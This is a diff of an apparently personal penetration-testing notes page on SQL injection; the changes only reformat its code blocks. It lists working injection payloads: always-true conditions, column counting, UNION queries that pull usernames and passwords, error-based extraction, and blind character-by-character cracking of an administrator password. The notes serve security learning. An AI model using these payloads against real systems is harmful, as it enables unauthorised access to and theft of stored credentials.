@@ -22,11 +22,11 @@ There are many SQLi vulnerabilities, attacks, and techniques, which all arise in
 
 ## Basic SQL Statement 
 A large amount of SQL statements on something like a product search page will be structured similarly too:
-{% highlight sql %}
+```sql
 SELECT * FROM {some-table(s)} WHERE {some-field} = '{some-query}'
 
 SELECT * FROM products WHERE categories = 'Gifts' AND released = 1
-{% endhighlight %}
+```
 
 ## Handling Different SQL System Syntax
 There is a variety of SQL platforms available now and each use slightly different SQL syntax to carry out operations. A useful cheatsheet can be found on the [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) here that details the different syntax for each main platform. There is also a fairly comprehensive cheat sheet [here](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet) for different systems.
@@ -36,9 +36,9 @@ A very basic way to exploit a statement like the above would be to break out of 
 
 Adding a simple `' OR 1=1--`, escapes the categories field value by ending the quotes, adds an `OR` statement followed by a statement that always evaluates as True. Finally we use a `--` to comment out any other statements following in the query.
 
-{% highlight sql %}
+```sql
 SELECT * FROM products WHERE categories = '' OR 1=1-- ' AND released = 1
-{% endhighlight %}
+```
 
 ## Determining the number of columns in a table
 Finding out the number of columns in a table can be very useful for construction a [UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks) as to `UNION` another table to the result you need to match the number of columns. This means before we can create this attack we need to determine how many columns are in the current table.
@@ -47,12 +47,12 @@ To do this we can use the `ORDER BY` command to determine how many columns are i
 
 This means that you can increase the number until you get a server error (indicating that you have tried to select a column index out of range) allowing you to determine the number of columns in a table.
 
-{% highlight sql %}
+```sql
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
 etc
-{% endhighlight %}
+```
 
 ## UNION Attacks
 `UNION` Attacks are where you use a `UNION` command to attach a secondary/multiple more statements to the end of an SQL command to retrieve information from another table or different columns.
@@ -62,62 +62,62 @@ Some key requirements for a UNION attack is that the number of columns that are 
 More information can also be found on the [PortSwigger UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks) page.
 
 #### Append a blank table to the end of the list with NULL values
-{% highlight sql %}
+```sql
 ' UNION SELECT NULL,NULL,NULL--
-{% endhighlight %}
+```
 
 #### Finding columns that have a useful data type
-{% highlight sql %}
+```sql
 ' UNION SELECT 'a',NULL,NULL,NULL--
 ' UNION SELECT NULL,'a',NULL,NULL--
 ' UNION SELECT NULL,NULL,'a',NULL--
 ' UNION SELECT NULL,NULL,NULL,'a'--
-{% endhighlight %}
+```
 
 #### Retrieving information from another table
 - For this you must make sure that you follow the appropriate number of columns needed for the UNION to work
 - This also requires you to know the column names and table name for the data you wish to access
-{% highlight sql %}
+```sql
 ' UNION SELECT username, password FROM users--
-{% endhighlight %}
+```
 
 #### Retrieving multiple values within a single column
 - If you wish to return data that is more columns that the original query you can concatinate the data from the extracted table into a single column
 - This could also be required if you only have limited columns that support the data type you require
-{% highlight sql %}
+```sql
 ' UNION SELECT username || '-' || password FROM users--
 ' UNION SELECT NULL,username || '-' || password FROM users--
-{% endhighlight %}
+```
 
 ## Error Based Extraction
 - If an application simply just returns an error to the user, data could possibly be extracted. A simple workflow could go as follows:
 ### Oracle Based:
 1. Try a simple error (this proves we can run SQL but fails because it wants a bool)
-{% highlight SQL %}
+```SQL
 ' AND CAST((SELECT 1) AS int)--
-{% endhighlight %}
+```
 
 2. Make it a bool condition (the error will no go away)
-{% highlight SQL %}
+```SQL
 ' AND 1=CAST((SELECT 1) AS int)-- 
-{% endhighlight %}
+```
 
 3. Extract information (this will fail as it tries to convert string to int, logging the string in the error)
-{% highlight SQL %}
+```SQL
 ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-{% endhighlight %}
+```
 
 ## Discovering System Information
 - There is often varibles and tables that come as default for many SQL implementations that details the versions and technologies used
 - These are specific to the languag but can be very helpful for recon on the target
 
-{% highlight sql %}
+```sql
 -- Oracle:
 SELECT banner FROM v$version
 SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’
 SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’
 SELECT version FROM v$instance
-{% endhighlight %}
+```
 
 The queries to determine the database version for some popular database types are as follows:
 
@@ -129,9 +129,9 @@ The queries to determine the database version for some popular database types ar
 |PostgreSQL|`SELECT version()`|
 
 For most database types (notably excluding Oracle) a set of views called the *Information schema* can provide database information:
-{% highlight sql %}
+```sql
 SELECT * FROM information_schema.tables
-{% endhighlight %}
+```
 
 This will return something like this:
 
@@ -142,15 +142,15 @@ This will return something like this:
 | OtherDatabase | public       | Feedback   | BASE TABLE | 
 
 Finding columns is simple after this:
-{% highlight sql %}
+```sql
 SELECT * FROM information_schema.columns WHERE table_name = 'Users'
-{% endhighlight %}
+```
 
 Equivalent information for *Oracle*:
-{% highlight sql %}
+```sql
 SELECT * FROM all_tables
 SELECT * FROM all_tab_columns WHERE table_name = 'Users'
-{% endhighlight %}
+```
 
 ## Blind SQL Injection Vulnerabilities
 A blind SQL injection is where the application doesn't return the results of the query or the details of any database errors within its response. These vulnerabilities can still be exploited to access unauthorized data, however, techniques are generally more complicated and difficult to perform.
@@ -161,11 +161,11 @@ Depending on the nature of the vulnerability, the following techniques can be us
 - You can trigger an out-of-band network interaction, using [OAST](https://alipali737.github.io/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#out-of-band-application-security-testing-oast) techniques. Often you can directly exfiltrate data via the out-of-band channel eg. placing the data into a DNS lookup for a domain you control.
 
 It is important to ensure that the injection is being treated as SQL and not something else, an easy way to do this is my trying to execute a simple SQL syntax (like string concatenation) and something the produced the opposite:
-{% highlight sql %}
+```sql
 Oracle: 
 a' || (SELECT '' FROM dual) || '
 a' || (SELECT '' FROM table-doesnt-exist) || '
-{% endhighlight %}
+```
 
 You can test a single boolean condition and trigger a database error if the condition is true.
 
@@ -177,29 +177,29 @@ You can test a single boolean condition and trigger a database error if the cond
 |MySQL|`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`|
 
 This can then be expanded such as:
-{% highlight sql %}
+```sql
 SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator'
-{% endhighlight %}
+```
 
 You can determine if a table exists by searching for the first row in a table:
-{% highlight sql %}
+```sql
 SELECT '' FROM users WHERE ROWNUM = 1
-{% endhighlight %}
+```
 
 A nice way to determine the length of a field could be by iterating over a condition of its length:
-{% highlight sql %}
+```sql
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a'
-{% endhighlight %}
+```
 
 For cracking the value you can repeat a similar technique by testing each letter one by 1:
-{% highlight sql %}
+```sql
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b'
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='c'
 ...
 ' AND (SELECT SUBSTRING(password,15,1) FROM users WHERE username='administrator')='a'
 ' AND (SELECT SUBSTRING(password,16,1) FROM users WHERE username='administrator')='a'
-{% endhighlight %}
+```
 
 This can then be automated in a simple script to determine the length and then crack the password (could even create a thread for each character and speed it up) or use a system like Burp Intruder for more basic automation
 
